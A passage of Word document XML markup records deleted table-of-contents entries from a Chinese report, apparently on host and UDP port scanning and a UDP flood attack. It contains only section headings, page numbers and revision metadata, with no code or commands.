        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="766" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="767" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="768" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>21</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7CDB63A6" w14:textId="5C75A700" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="769" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="770" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="771" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.3.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="772" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>流程图</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>21</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="078AC142" w14:textId="4CB98C6C" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="773" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="774" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="775" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.3.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="776" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主要数据</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>21</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7124AE75" w14:textId="2331E08C" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="777" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="778" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="779" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.3.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="780" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主要函数</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>23</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2745A229" w14:textId="2C32C2D8" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="781" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="782" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="783" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>4.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="784" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>本章小结</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>24</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="356AC8DA" w14:textId="0E7C2B81" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="785" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="786" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="787" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="788" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>程序实现</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>25</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5CA81162" w14:textId="2FDC2601" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="789" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="790" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="791" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="792" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主机扫描</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>25</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="36AFD3AA" w14:textId="5FADD9B0" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="793" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="794" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="795" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.1.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="796" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>hostScan</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="797" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>函数</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>25</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1257EC4A" w14:textId="5C871E43" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="798" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="799" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="800" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.1.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="801" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>ping</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="802" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>函数</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>25</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="521089F4" w14:textId="49F1BDCA" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="803" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="804" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="805" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="806" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="807" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>端口扫描</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>30</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5F8942E2" w14:textId="14782F64" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="808" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="809" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="810" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.2.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="811" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>网卡选择</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>30</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2FD7D1DD" w14:textId="01DAE6F7" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="812" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="813" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="814" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.2.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="815" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>网卡信息获取</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>30</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="059AC522" w14:textId="34A0AB9F" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="816" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
